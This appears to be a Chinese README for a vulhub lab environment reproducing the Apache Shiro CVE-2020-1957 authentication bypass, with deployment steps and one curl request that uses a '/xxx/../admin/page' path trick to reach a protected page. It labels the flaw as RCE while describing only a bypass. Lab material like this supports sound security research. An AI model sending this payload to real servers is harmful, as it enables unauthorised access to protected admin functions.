# Shiro RCE (CVE-2020-1957)

## 漏洞简介

Apache Shiro 是一个强大的安全框架，用于身份验证、授权、加密和会话管理。CVE-2020-1957 是 Apache Shiro 的认证绕过漏洞，攻击者可以通过构造特殊的 URL 路径来绕过身份验证。

## CVE 信息

- **CVE 编号**: CVE-2020-1957
- **漏洞类型**: RCE / 认证绕过
- **危险等级**: High (高危)
- **影响版本**: Shiro < 1.5.2

## 环境信息

- **镜像**: vulhub/shiro:1.4.2
- **端口**: 8080
- **服务**: Shiro RCE 测试环境

## 使用方法

1. 在云服务器上执行 userdata 脚本
2. 脚本会自动安装 Docker 并启动 Shiro 漏洞环境
3. 访问 `http://<your-ip>:8080` 进行测试

## 测试方法

```bash
# 构造认证绕过请求
curl -X GET "http://<your-ip>:8080/xxx/../admin/page"
```

## 注意事项

- 此环境仅用于安全研究
- 请在防火墙中限制访问来源
- 测试完成后请及时删除环境

## 参考链接

- [Vulhub Shiro 漏洞环境](https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2020-1957)
- [NVD CVE-2020-1957](https://nvd.nist.gov/vuln/detail/CVE-2020-1957)
